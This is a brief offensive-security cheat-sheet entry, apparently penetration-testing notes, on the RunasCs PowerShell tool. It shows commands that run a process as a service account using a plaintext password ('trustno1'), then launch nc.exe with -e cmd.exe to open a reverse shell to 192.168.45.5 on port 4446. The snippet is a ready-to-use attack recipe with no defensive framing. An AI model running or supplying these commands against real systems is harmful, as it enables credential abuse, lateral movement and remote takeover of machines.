
## RunasCs

**Source:** [RunasCs Binaries](https://github.com/0x8e8fb-p/Binaries/blob/main/Invoke-RunasCs.ps1)

```powershell
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "cmd /c whoami"
Invoke-RunasCs svc_mssql trustno1 'C:\xampp\test\nc.exe -nd 192.168.45.5 4446 -e cmd.exe'
